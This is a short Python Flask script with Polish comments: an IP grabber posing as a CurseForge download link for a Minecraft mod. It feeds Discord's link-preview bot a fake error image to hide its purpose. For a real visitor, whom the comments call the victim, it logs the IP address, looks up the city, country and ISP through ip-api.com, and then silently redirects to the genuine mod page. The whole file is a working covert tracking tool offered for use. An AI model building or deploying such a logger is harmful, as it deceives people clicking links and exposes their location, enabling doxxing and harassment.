from flask import Flask, request, redirect, make_response
import requests

app = Flask(__name__)

# --- KONFIGURACJA ---
# Obrazek błędu dla bota Discorda
ERROR_IMG = "https://preview.redd.it/failed-to-load-image-on-mobile-v0-v9v846fbt01a1.png?width=1080&format=png&auto=webp&s=5568f1857948270139b8f2f458e0a3f6a27e029c"

# Prawdziwy link, na który trafi ofiara (musi być taki sam jak ten "widoczny")
REAL_CURSEFORGE_LINK = "https://www.curseforge.com/minecraft/mc-mods/timeless-and-classics-zero/download/7401617"

@app.route('/download/7401617') # Udajemy ścieżkę pobierania
def logger():
    ua = request.headers.get('User-Agent', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]

    # Obsługa bota Discorda (podgląd błędu)
    if "Discordbot" in ua or "externalhit" in ua.lower():
        response = make_response(redirect(ERROR_IMG))
        response.headers['Content-Type'] = 'image/png'
        return response

    # LOGOWANIE DANYCH
    print(f"\n[!!!] PRZECHWYCONO IP: {ip}")
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp", timeout=5).json()
        if r.get("status") == "success":
            print(f"LOKALIZACJA: {r.get('city')}, {r.get('country')}")
            print(f"DOSTAWCA: {r.get('isp')}")
    except:
        pass

    # BŁYSKAWICZNE PRZEKIEROWANIE DO CURSEFORGE
    return redirect(REAL_CURSEFORGE_LINK)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
